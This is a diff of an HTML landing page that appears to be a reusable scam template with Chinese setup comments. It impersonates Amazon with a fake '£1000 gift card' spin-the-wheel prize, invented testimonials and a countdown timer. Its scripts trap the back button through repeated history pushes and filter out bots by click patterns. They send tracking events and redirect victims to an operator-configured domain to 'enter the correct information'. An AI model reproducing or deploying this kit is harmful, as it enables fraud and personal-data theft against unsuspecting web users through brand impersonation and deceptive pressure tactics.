@@ -2,460 +2,409 @@
 <html lang="en" webdriver="true">
 
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <link rel="shortcut icon" href="favicon.ico">
-    <title>(1) Amazon Gift!</title>
-    <link rel="stylesheet" type="text/css" href="css/style.css">
-    <script>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <link rel="shortcut icon" href="favicon.ico">
+  <title>(1) Amazon Gift!</title>
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+  <script>
 
-        let domain = 'test.lx100.com/'; //替换成你的域名
-        let protocol = 'http'; //如果不支持https, 请改为 http
+      let domain = 'yourdomain.com'; //替换成你的域名
+      let protocol = 'https'; //如果不支持https, 请改为 http
 
-        (function () {
+      (function(){
 
-            window.afilter = function (event, detail, token) {
+          window.afilter = function(event,detail,token){
 
-                if (Number(event) <= 0) return;
+              if(Number(event) <= 0) return;
 
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', protocol + '://' + domain + '/p/events', true);
-                xhr.withCredentials = true;
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("et=" + event + "&v=" + detail + "&t=" + token);
+              var xhr = new XMLHttpRequest();
+              xhr.open('POST', protocol + '://' + domain +'/p/events', true);
+              xhr.withCredentials = true;
+              xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+              xhr.send("et=" + event + "&v=" + detail + "&t=" + token);
 
-            };
+          };
 
-            window.atgo = function (url) {
-                window.location.replace(protocol + '://' + domain + '/' + url);
-            };
+          window.atgo = function(url){
+              window.location.replace(protocol + '://' + domain + '/' + url);
+          };
 
 
-        }());
 
-        //定义绑定事件, 设置为0不做判断,
+      }());
 
-        let at_onload = 4; //页面完全加载
-        window.onload = function () {
+      //定义绑定事件, 设置为0不做判断,
 
-            //页面完全加载了,这个时候回传页面完全加载事件.
-            afilter(at_onload);
+      let at_onload = 4; //页面完全加载
+      window.onload = function () {
 
-        };
+          //页面完全加载了,这个时候回传页面完全加载事件.
+          afilter(at_onload);
 
-        "use strict";
-        !function () {
-            var e = {clicks: {clickCount: 0, clickWrong: 0, clickDetails: []}};
-            window.AtRequest = function (e = "GET", t, n = null) {
-                var o = new XMLHttpRequest;
-                o.open(e, t, !0), o.withCredentials = !0, n && o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), o.send(n)
-            }, window.AtClickCheck = function (t = ["p", "button", "a"], n = 3, o = 0) {
-                document.addEventListener("DOMContentLoaded", function () {
-                    document.addEventListener("mouseup", function (c) {
-                        e.clicks.clickCount++, e.clicks.clickDetails.push({
-                            timestamp: Date.now(),
-                            node: c.target.nodeName,
-                            x: c.pageX,
-                            y: c.pageY
-                        }), o > 0 && console.log(c.target.nodeName), t.indexOf(c.target.nodeName.toLowerCase()) < 0 && e.clicks.clickWrong++, e.clicks.clickWrong > n && (o > 0 && console.log("Bot"), AtRequest("GET", `${protocol}://${domain}/d/wrong`))
-                    })
-                })
-            }
-        }();
+      };
 
-        // AtClickCheck 支持3个参数, 分别为
-        // AtClickCheck([支持的标签数组],最大错误点击次数,是否开启调试模式);
-        // 请将标签转为小写
-        AtClickCheck(['h3', 'span', 'img'], 2, 1);
+      "use strict";!function(){var e={clicks:{clickCount:0,clickWrong:0,clickDetails:[]}};window.AtRequest=function(e="GET",t,n=null){var o=new XMLHttpRequest;o.open(e,t,!0),o.withCredentials=!0,n&&o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.send(n)},window.AtClickCheck=function(t=["p","button","a"],n=3,o=0){document.addEventListener("DOMContentLoaded",function(){document.addEventListener("mouseup",function(c){e.clicks.clickCount++,e.clicks.clickDetails.push({timestamp:Date.now(),node:c.target.nodeName,x:c.pageX,y:c.pageY}),o>0&&console.log(c.target.nodeName),t.indexOf(c.target.nodeName.toLowerCase())<0&&e.clicks.clickWrong++,e.clicks.clickWrong>n&&(o>0&&console.log("Bot"),AtRequest("GET",`${protocol}://${domain}/d/wrong`))})})}}();
 
-        //如果需要关闭调试模式, 请改为，即，第三个参数删除。
-        // AtClickCheck(['h3','span',,'img'],2);
+      // AtClickCheck 支持3个参数, 分别为
+      // AtClickCheck([支持的标签数组],最大错误点击次数,是否开启调试模式);
+      // 请将标签转为小写
+      AtClickCheck(['h3','span','img'],2,1);
 
-    </script>
-    <script type="text/javascript">
-        /*<![CDATA[*/
-        function getURLParameter(a) {
-            return decodeURI((RegExp(a + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
-        }
+      //如果需要关闭调试模式, 请改为，即，第三个参数删除。
+      // AtClickCheck(['h3','span',,'img'],2);
 
-        setTimeout(function () {
-            alert("Congratulations Amazon user!\n\nWe have specially selected you to receive Amazon rewards for your loyalty.\n\nThis gift is exclusive to Amazon users in " + getURLParameter("region") + ".\n\nClick OK to confirm.\n")
-        }, 200); /*]]>*/
-    </script>
-    <script>/*<![CDATA[*/
-    !function () {
-        var a;
-        try {
-            for (a = 0; 30 > a; ++a) {
-                history.pushState({}, "", "#")
-            }
-            onpopstate = function (c) {
-                c.state && location.replace("#")
-            }
-        } catch (b) {
-        }
-    }();/*]]>*/</script>
+  </script>
+  <script type="text/javascript">
+    /*<![CDATA[*/
+    function getURLParameter(a) {
+      return decodeURI((RegExp(a + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
+    }
+    setTimeout(function() {
+      alert("Congratulations Amazon user!\n\nWe have specially selected you to receive Amazon rewards for your loyalty.\n\nThis gift is exclusive to Amazon users in " + getURLParameter("region") + ".\n\nClick OK to confirm.\n")
+    }, 200); /*]]>*/
+  </script>
+  <script>/*<![CDATA[*/!function(){var a;try{for(a=0;30>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&location.replace("#")}}catch(b){}}();/*]]>*/</script>
 </head>
 
 <body onload="setButtonHeight(),autospin1()">
-<style type="text/css">
+  <style type="text/css">
     .button {
-        cursor: pointer
+      cursor: pointer
     }
-</style>
-<div class="header">
+  </style>
+  <div class="header">
     <div class="logo"></div>
     <div class="ricon1"></div>
     <div class="ricon2"></div>
-</div>
-<div class="subheader"><span class="subheadertitle">Membership Rewards</span></div>
-<div class="spacer"></div>
-<div class="wrapper">
+  </div>
+  <div class="subheader"> <span class="subheadertitle">Membership Rewards</span> </div>
+  <div class="spacer"></div>
+  <div class="wrapper">
     <div id="container" class="contestwrap wrapper">
-        <div id="firstpage" class="toptext">
-            <table class="wrapper">
-                <tbody>
-                <tr>
-                    <td align="center" valign="top">
-                        <b>
-                            Congratulations Amazon User, you have (1) Amazon Reward Pending!<br>
-                        </b>
-                        <br>
-                        <font style="color:#9fa2a6;font-size:x-small">
+      <div id="firstpage" class="toptext">
+        <table class="wrapper">
+          <tbody>
+            <tr>
+              <td align="center" valign="top">
+                <b>
+                  Congratulations Amazon User, you have (1) Amazon Reward Pending!<br>
+                </b>
+                <br>
+                <font style="color:#9fa2a6;font-size:x-small">
                   <span class="today_date_full">
-                        </font>
-                    </td>
-                </tr>
-                </tbody>
-            </table>
-            <div>
-                <p class="wrapper">
-                    Every <span class="today_readable"></span> we choose 10 lucky users randomly from <span
-                        class="get_region"></span> to receive a reward from Amazon. This is our way to thank you for
-                    your continuing support for our products and services!
-                    <br>
-                    <br>
-                </p>
-                <div class="yo"
-                     style="background-color:#232f3e;color:white;border-radius:0;margin:0;padding:0;padding-bottom:10px;margin-top:7px;padding-top:5px;width:100%">
-                    <h2 style="margin:0;padding:0;padding-bottom:3px">Claim Your Prize</h2>
-                    <h2 style="margin:0;padding:0"><span class="bounce">↓</span> Spin the wheel <span
-                            class="bounce">↓</span></h2>
-                </div>
-                <br>
-                <br>
-                <p></p>
-            </div>
-            <div id="wheelCon"><img id="wheel" src="images/spin1k.png" width="330" height="330"
-                                    class="spinAround2 transparent">
-                <div id="pressButton" style="top:102.9px"></div>
-                <div><img id="devMockup" class="animated rotateIn" src="images/1k.png" width="140" height="280"
-                          style="left:98.5px;top:125px">
-                </div>
-            </div>
+                </font>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <div>
+          <p class="wrapper">
+            Every <span class="today_readable"></span> we choose 10 lucky users randomly from <span class="get_region"></span> to receive a reward from Amazon. This is our way to thank you for your continuing support for our products and services!
+            <br>
+            <br>
+          </p>
+          <div class="yo" style="background-color:#232f3e;color:white;border-radius:0;margin:0;padding:0;padding-bottom:10px;margin-top:7px;padding-top:5px;width:100%">
+            <h2 style="margin:0;padding:0;padding-bottom:3px">Claim Your Prize</h2>
+            <h2 style="margin:0;padding:0"><span class="bounce">↓</span> Spin the wheel <span class="bounce">↓</span></h2>
+          </div>
+          <br>
+          <br>
+          <p></p>
         </div>
+        <div id="wheelCon"><img id="wheel" src="images/spin1k.png" width="330" height="330" class="spinAround2 transparent">
+          <div id="pressButton" style="top:102.9px"></div>
+          <div><img id="devMockup" class="animated rotateIn" src="images/1k.png" width="140" height="280" style="left:98.5px;top:125px">
+          </div>
+        </div>
+      </div>
     </div>
     <div class="spacer"></div>
     <div class="reviews wrapper">
-        <div class="wrapper">
-            <h2>Comments:</h2>
-        </div>
-        <table class="wrapper" style="padding-top:8px">
-            <tbody>
-            <tr>
-                <td width="50px" valign="top" align="right"><img class="roundimg" src="images/8.jpg"></td>
-                <td align="left" valign="top" class="commentpad">
-                    <div class="name">Gracie Aldrich</div>
-                    <div class="text">My iPhone 8 Plus came in the mail today!! I am amazed and grateful!!</div>
-                    <div class="date">
-                        <span class="today_date"></span>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
-        <hr>
-        <table class="wrapper">
-            <tbody>
-            <tr>
-                <td width="50px" valign="top" align="right"><img class="roundimg" src="images/1.jpg"></td>
-                <td align="left" valign="top" class="commentpad">
-                    <div class="name">Margaret Young</div>
-                    <div class="text">
-                        I thought this was a joke at first, but my iPhone actually came into my mail this morning.
-                        #legit
-                    </div>
-                    <div class="date">
-                        <span class="today_date_minus_2"></span>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
-        <hr>
-        <table class="wrapper">
-            <tbody>
-            <tr>
-                <td width="50px" valign="top" align="right"><img class="roundimg" src="images/2.jpg"></td>
-                <td align="left" valign="top" class="commentpad">
-                    <div class="name">Jacob Lamm</div>
-                    <div class="text">I'm not a gamer, but I just chose the PS4! Why not?! LOL</div>
-                    <div class="date">
-                        <span class="today_date_minus_2"></span>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
-        <hr>
-        <table class="wrapper">
-            <tbody>
-            <tr>
-                <td width="50px" valign="top" align="right"><img class="roundimg" src="images/4.jpg"></td>
-                <td align="left" valign="top" class="commentpad">
-                    <div class="name">George Miller</div>
-                    <div class="text">Yesterday there was a delivery! I gave the iphone to my lovley wife's birthday...
-                        Love u babe )
-                    </div>
-                    <div class="date">
-                        <span class="today_date_minus_2"></span>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
-        <hr>
-        <table class="wrapper">
-            <tbody>
-            <tr>
-                <td width="50px" valign="top" align="right"><img class="roundimg" src="images/3.jpg"></td>
-                <td align="left" valign="top" class="commentpad">
-                    <div class="name">Roy Eyler</div>
-                    <div class="text">It was easy, hope i get a PS4...</div>
-                    <div class="date">
-                        <span class="today_date_minus_2"></span>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
-        <hr>
-        <table class="wrapper">
-            <tbody>
-            <tr>
-                <td width="50px" valign="top" align="right"><img class="roundimg" src="images/5.jpg"></td>
-                <td align="left" valign="top" class="commentpad">
-                    <div class="name">Norah Miller</div>
-                    <div class="text">Saw this one time offer and clicked it off because I thought it was fake. I saw
-                        the ad again and because I was bored so I decided to try it ... And I got a NEW iphone 7 Plus!
-                        What!!?!
-                    </div>
-                    <div class="date">
-                        <span class="today_date_minus_2"></span>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
-        <hr>
-        <table class="wrapper">
-            <tbody>
-            <tr>
-                <td width="50px" valign="top" align="right"><img class="roundimg" src="images/6.jpg"></td>
-                <td align="left" valign="top" class="commentpad">
-                    <div class="name">Jamie Byrnes</div>
-                    <div class="text">Thanks, I have given the PS4 to my brother for his birthday. Lol he is for me :D
-                        :D :D God Blessed.
-                    </div>
-                    <div class="date">
-                        <span class="today_date_minus_3"></span>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
-        <hr>
-        <table class="wrapper">
-            <tbody>
-            <tr>
-                <td width="50px" valign="top" align="right"><img class="roundimg" src="images/7.jpg"></td>
-                <td align="left" valign="top" class="commentpad">
-                    <div class="name">Clarence Reck</div>
-                    <div class="text">Fantastic! I've never won anything, but I hope I am lucky!!</div>
-                    <div class="date">
-                        <span class="today_date_minus_4"></span>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
+      <div class="wrapper">
+        <h2>Comments:</h2>
+      </div>
+      <table class="wrapper" style="padding-top:8px">
+        <tbody>
+          <tr>
+            <td width="50px" valign="top" align="right"> <img class="roundimg" src="images/8.jpg"> </td>
+            <td align="left" valign="top" class="commentpad">
+              <div class="name">Gracie Aldrich</div>
+              <div class="text">My iPhone 8 Plus came in the mail today!! I am amazed and grateful!!</div>
+              <div class="date">
+                <span class="today_date"></span>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <hr>
+      <table class="wrapper">
+        <tbody>
+          <tr>
+            <td width="50px" valign="top" align="right"> <img class="roundimg" src="images/1.jpg"> </td>
+            <td align="left" valign="top" class="commentpad">
+              <div class="name">Margaret Young</div>
+              <div class="text">
+                I thought this was a joke at first, but my iPhone actually came into my mail this morning. #legit
+              </div>
+              <div class="date">
+                <span class="today_date_minus_2"></span>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <hr>
+      <table class="wrapper">
+        <tbody>
+          <tr>
+            <td width="50px" valign="top" align="right"> <img class="roundimg" src="images/2.jpg"> </td>
+            <td align="left" valign="top" class="commentpad">
+              <div class="name">Jacob Lamm</div>
+              <div class="text">I'm not a gamer, but I just chose the PS4! Why not?! LOL</div>
+              <div class="date">
+                <span class="today_date_minus_2"></span>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <hr>
+      <table class="wrapper">
+        <tbody>
+          <tr>
+            <td width="50px" valign="top" align="right"> <img class="roundimg" src="images/4.jpg"> </td>
+            <td align="left" valign="top" class="commentpad">
+              <div class="name">George Miller</div>
+              <div class="text">Yesterday there was a delivery! I gave the iphone to my lovley wife's birthday... Love u babe )</div>
+              <div class="date">
+                <span class="today_date_minus_2"></span>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <hr>
+      <table class="wrapper">
+        <tbody>
+          <tr>
+            <td width="50px" valign="top" align="right"> <img class="roundimg" src="images/3.jpg"> </td>
+            <td align="left" valign="top" class="commentpad">
+              <div class="name">Roy Eyler</div>
+              <div class="text">It was easy, hope i get a PS4...</div>
+              <div class="date">
+                <span class="today_date_minus_2"></span>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <hr>
+      <table class="wrapper">
+        <tbody>
+          <tr>
+            <td width="50px" valign="top" align="right"> <img class="roundimg" src="images/5.jpg"> </td>
+            <td align="left" valign="top" class="commentpad">
+              <div class="name">Norah Miller</div>
+              <div class="text">Saw this one time offer and clicked it off because I thought it was fake. I saw the ad again and because I was bored so I decided to try it ... And I got a NEW iphone 7 Plus! What!!?!</div>
+              <div class="date">
+                <span class="today_date_minus_2"></span>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <hr>
+      <table class="wrapper">
+        <tbody>
+          <tr>
+            <td width="50px" valign="top" align="right"> <img class="roundimg" src="images/6.jpg"> </td>
+            <td align="left" valign="top" class="commentpad">
+              <div class="name">Jamie Byrnes</div>
+              <div class="text">Thanks, I have given the PS4 to my brother for his birthday. Lol he is for me :D :D :D God Blessed.</div>
+              <div class="date">
+                <span class="today_date_minus_3"></span>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <hr>
+      <table class="wrapper">
+        <tbody>
+          <tr>
+            <td width="50px" valign="top" align="right"> <img class="roundimg" src="images/7.jpg"> </td>
+            <td align="left" valign="top" class="commentpad">
+              <div class="name">Clarence Reck</div>
+              <div class="text">Fantastic! I've never won anything, but I hope I am lucky!! </div>
+              <div class="date">
+                <span class="today_date_minus_4"></span>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
     </div>
-</div>
-<div style="height:40px"></div>
-<div id="secondpage" class="wrapper">
+  </div>
+  <div style="height:40px"></div>
+  <div id="secondpage" class="wrapper">
     <div class="congrats" style="padding-top:5px">
-        <h3>
-            <font color="#3c5a96">Congratulations!<br> (1)
-                <font style="color:red;font-weight:bold">£1000 Amazon Gift Card </font> is reserved for you!</font>
-        </h3>
+      <h3>
+        <font color="#3c5a96">Congratulations!<br> (1)
+          <font style="color:red;font-weight:bold">£1000 Amazon Gift Card </font> is reserved for you!</font>
+      </h3>
     </div>
     <div class="congrats" style="text-align:left;margin-top:5px;margin-left:5px">
-        <p><b>Step 1:</b> Click the "CONTINUE" button to claim your prize. </p>
-        <p><b>Step 2:</b> Enter the correct information on the next page to claim your prize. </p>
-        <p style="padding-top:10px"><b>Important:</b> Hurry, limited quantities only. </p>
+      <p><b>Step 1:</b> Click the "CONTINUE" button to claim your prize. </p>
+      <p><b>Step 2:</b> Enter the correct information on the next page to claim your prize. </p>
+      <p style="padding-top:10px"><b>Important:</b> Hurry, limited quantities only. </p>
     </div>
-    <div class="timer" style="margin-top:5px;margin-left:5px">You only have <font color="green"><b><span
-            id="mins">5</span> minutes <span id="hsecs">30</span> seconds to claim your prize!</b>
-    </font>
+    <div class="timer" style="margin-top:5px;margin-left:5px">You only have <font color="green"><b><span id="mins">5</span> minutes <span id="hsecs">30</span> seconds to claim your prize!</b>
+      </font>
     </div>
     <div class="prize">
-        <table>
-            <tbody>
-            <tr>
-                <th></th>
-                <td style="padding:10px 5px 10px 0;text-align:center">
-                    <img src="images/1k.png" style="max-width:100px">
-                    <p><b>2 remaining! </b>
-                    </p>
-                </td>
-                <td style="line-height:1.6">
-                    <p style="text-align:left"><span class="name">£1000 Amazon Gift Card</span>
-                    </p>
-                    <div><a href="javascript:void(0)" rel="noreferrer" class="button"
-                            onclick="exit_a1();PreventExitPop=false">CONTINUE</a>
-                    </div>
-                </td>
-            </tr>
-            </tbody>
-        </table>
+      <table>
+        <tbody>
+          <tr>
+            <th></th>
+            <td style="padding:10px 5px 10px 0;text-align:center">
+              <img src="images/1k.png" style="max-width:100px">
+              <p><b>2 remaining! </b>
+              </p>
+            </td>
+            <td style="line-height:1.6">
+              <p style="text-align:left"><span class="name">£1000 Amazon Gift Card</span>
+              </p>
+              <div><a href="javascript:void(0)" rel="noreferrer" class="button" onclick="exit_a1();PreventExitPop=false">CONTINUE</a>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
     </div>
-</div>
-<div class="sweet-overlay" style="opacity:1.03;display:block" tabindex="-1"></div>
-<div class="sweet-alert animated bounceIn visible" id="modal01" style="top:38%">
+  </div>
+  <div class="sweet-overlay" style="opacity:1.03;display:block" tabindex="-1"></div>
+  <div class="sweet-alert animated bounceIn visible" id="modal01" style="top:38%">
     <img id="gift-image" src="images/gift.gif" style="width:70px">
     <img id="gift-image2" src="images/refresh.png" style="width:70px;display:none">
     <h2 id="first-title" style="margin-top:-10px;padding-bottom:-5px;margin-bottom:0">Amazon Rewards Event</h2>
     <p id="first-dialog" style=""></p>
     </p>
     <div class="sa-button-container">
-        <div class="sa-confirm-button-container">
-            <button onclick="hidemodal01()"
-                    style="display:inline-block;box-shadow:rgba(140,212,245,0.8) 0 0 2px,rgba(0,0,0,0.0470588) 0 0 0 1px inset;background-color:#ffa400;color:#232f3e">
-                OK
-            </button>
-            <div class="la-ball-fall"></div>
-        </div>
+      <div class="sa-confirm-button-container">
+        <button onclick="hidemodal01()" style="display:inline-block;box-shadow:rgba(140,212,245,0.8) 0 0 2px,rgba(0,0,0,0.0470588) 0 0 0 1px inset;background-color:#ffa400;color:#232f3e">OK</button>
+        <div class="la-ball-fall"></div>
+      </div>
     </div>
-</div>
-<script type="text/javascript">
+  </div>
+  <script type="text/javascript">
     /*<![CDATA[*/
     var p = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"),
-        n = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+      n = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
 
     function getDate(h, f, k) {
-        var b = new Date;
-        b.setDate(b.getDate() - h);
-        var j = b.getDate();
-        j < 10 && (j = "0" + j);
-        var c = b.getMonth(),
-            g = b.getFullYear();
-        return f ? p[b.getDay()] : k ? n[c] + " " + j + ", " + g : n[c] + " " + j
+      var b = new Date;
+      b.setDate(b.getDate() - h);
+      var j = b.getDate();
+      j < 10 && (j = "0" + j);
+      var c = b.getMonth(),
+        g = b.getFullYear();
+      return f ? p[b.getDay()] : k ? n[c] + " " + j + ", " + g : n[c] + " " + j
     }
 
     function addText(b, a) {
-        for (var d = document.getElementsByClassName(b), c = 0; c < d.length; c++) {
-            d[c].innerText = a
-        }
+      for (var d = document.getElementsByClassName(b), c = 0; c < d.length; c++) {
+        d[c].innerText = a
+      }
     }
 
     function hidemodal01() {
-        document.getElementById("modal01").classList.remove("visible"), document.querySelector(".sweet-overlay").style.display = "none";
-        spin();
-        // 埋点二
+      document.getElementById("modal01").classList.remove("visible"), document.querySelector(".sweet-overlay").style.display = "none";
+      spin();
+      // 埋点二
     }
 
     function showmodal01() {
-        document.getElementById("modal01").classList.add("visible"), document.querySelector(".sweet-overlay").style.display = "float"
+      document.getElementById("modal01").classList.add("visible"), document.querySelector(".sweet-overlay").style.display = "float"
     }
 
     function hidemodal02() {
-        vibr > 0 && navigator.vibrate(70);
-        document.getElementById("modal02").classList.remove("visible"), document.querySelector(".sweet-overlay").style.display = "none"
+      vibr > 0 && navigator.vibrate(70);
+      document.getElementById("modal02").classList.remove("visible"), document.querySelector(".sweet-overlay").style.display = "none"
     }
 
     function setButtonHeight() {
-        conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top = conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
+      conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top = conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
     }
 
     function spin() {
-        switch (count) {
-            case 1:
-                dWheel.className = "spinAround", setTimeout(function () {
-                    document.getElementById("gift-image").style.display = "none", document.getElementById("gift-image2").style.display = "", document.getElementById("first-title").innerHTML = "Try again!", document.getElementById("first-dialog").innerHTML = "Sorry.<p>Please try again. You still have 1 chance!", document.getElementById("modal01").style.top = "55%", showmodal01()
-                }, 6800);
-                afilter(2); //第一次转盘
-                // 埋点一
+      switch (count) {
+          case 1:
+          dWheel.className = "spinAround", setTimeout(function() {
+            document.getElementById("gift-image").style.display = "none", document.getElementById("gift-image2").style.display = "", document.getElementById("first-title").innerHTML = "Try again!", document.getElementById("first-dialog").innerHTML = "Sorry.<p>Please try again. You still have 1 chance!", document.getElementById("modal01").style.top = "55%", showmodal01()
+          }, 6800);
+          afilter(2); //第一次转盘
+          // 埋点一
 
-                break;
-            case 2:
-                dWheel.className = "spinAround2", setTimeout(function () {
-                    dWheel.className = dWheel.className + " transparent"
-                }, 6800), setTimeout(function () {
-                    device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
-                }, 7000), setTimeout(function () {
-                    first.innerHTML = "<img src='images/loading.gif'>", first.style.padding = "195px 0px", setTimeout(function () {
-                        first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con.firstChild), setInterval("countdown()", 1000)
-                    }, 1500)
-                }, 9000);
-                afilter(3); //第二次转盘
-            // 埋点二
-        }
-        count++
+          break;
+        case 2:
+          dWheel.className = "spinAround2", setTimeout(function() {
+            dWheel.className = dWheel.className + " transparent"
+          }, 6800), setTimeout(function() {
+            device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+          }, 7000), setTimeout(function() {
+            first.innerHTML = "<img src='images/loading.gif'>", first.style.padding = "195px 0px", setTimeout(function() {
+              first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con.firstChild), setInterval("countdown()", 1000)
+            }, 1500)
+          }, 9000);
+          afilter(3); //第二次转盘
+          // 埋点二
+      }
+      count++
     }
-
     addText("today_readable", getDate(0, !0)), addText("today_date", getDate(0)), addText("today_date_minus_2", getDate(2)), addText("today_date_minus_3", getDate(3)), addText("today_date_minus_4", getDate(4)), addText("today_date_full", getDate(0, !1, !0)), addText("get_region", getURLParameter("region"));
     var conMid, mydate = new Date,
-        year = mydate.getFullYear(),
-        day = mydate.getDate(),
-        weekday = mydate.getDay(),
-        count = 1,
-        headline = document.getElementById("headline"),
-        today = document.getElementById("today"),
-        con = document.getElementById("container"),
-        whCon = document.getElementById("wheelCon"),
-        dWheel = document.getElementById("wheel"),
-        button = document.getElementById("pressButton"),
-        device = document.getElementById("devMockup"),
-        first = document.getElementById("firstpage"),
-        second = document.getElementById("secondpage");
+      year = mydate.getFullYear(),
+      day = mydate.getDate(),
+      weekday = mydate.getDay(),
+      count = 1,
+      headline = document.getElementById("headline"),
+      today = document.getElementById("today"),
+      con = document.getElementById("container"),
+      whCon = document.getElementById("wheelCon"),
+      dWheel = document.getElementById("wheel"),
+      button = document.getElementById("pressButton"),
+      device = document.getElementById("devMockup"),
+      first = document.getElementById("firstpage"),
+      second = document.getElementById("secondpage");
 
     function autospin1() {
-        document.getElementById("pressButton").disabled = !0, document.getElementById("first-title").innerHTML = "Amazon Rewards Event", document.getElementById("first-dialog").innerHTML = "<b>" + getDate(0) + ", 2018</b><p> Congratulations Amazon user! 🎉</p><p>We would like to thank you for your loyalty to Amazon - so we are offering you the chance to receive a reward.<p>Spin the wheel to claim your special prize 🎁<br><br><b>Good Luck!</b>", document.getElementById("modal01").style.top = "38%"
+      document.getElementById("pressButton").disabled = !0, document.getElementById("first-title").innerHTML = "Amazon Rewards Event", document.getElementById("first-dialog").innerHTML = "<b>" + getDate(0) + ", 2018</b><p> Congratulations Amazon user! 🎉</p><p>We would like to thank you for your loyalty to Amazon - so we are offering you the chance to receive a reward.<p>Spin the wheel to claim your special prize 🎁<br><br><b>Good Luck!</b>", document.getElementById("modal01").style.top = "38%"
     }
 
     function autospin2() {
-        spin()
+      spin()
     }
 
     function speak(b) {
-        var a = new SpeechSynthesisUtterance,
-            c = speechSynthesis.getVoices();
-        a.voice = c[6], a.voiceURI = "native", a.volume = 1, a.rate = 1, a.pitch = 1, a.text = b, a.lang = "en-US", speechSynthesis.speak(a)
+      var a = new SpeechSynthesisUtterance,
+        c = speechSynthesis.getVoices();
+      a.voice = c[6], a.voiceURI = "native", a.volume = 1, a.rate = 1, a.pitch = 1, a.text = b, a.lang = "en-US", speechSynthesis.speak(a)
     }
 
     function countdown() {
-        var b = parseInt(document.getElementById("mins").innerHTML),
-            a = parseInt(document.getElementById("hsecs").innerHTML);
-        0 != b && 0 == a ? (nmins = b - 1, nsecs = 59) : 0 != b || 0 != a ? (nmins = b, nsecs = a - 1) : 0 == b && 0 == a && (nmins = b, nsecs = a), document.getElementById("mins").innerHTML = nmins, document.getElementById("hsecs").innerHTML = nsecs, nsecs < 10 && (nsecs = "0" + nsecs)
+      var b = parseInt(document.getElementById("mins").innerHTML),
+        a = parseInt(document.getElementById("hsecs").innerHTML);
+      0 != b && 0 == a ? (nmins = b - 1, nsecs = 59) : 0 != b || 0 != a ? (nmins = b, nsecs = a - 1) : 0 == b && 0 == a && (nmins = b, nsecs = a), document.getElementById("mins").innerHTML = nmins, document.getElementById("hsecs").innerHTML = nsecs, nsecs < 10 && (nsecs = "0" + nsecs)
     }
 
     function exit_a1() {
-        window.onbeforeunload = null, atgo('click')
+      window.onbeforeunload = null, atgo('click')
     }
-
     speak("Congratulations!"); /*]]>*/
-</script>
+  </script>
 </body>
 
 </html>
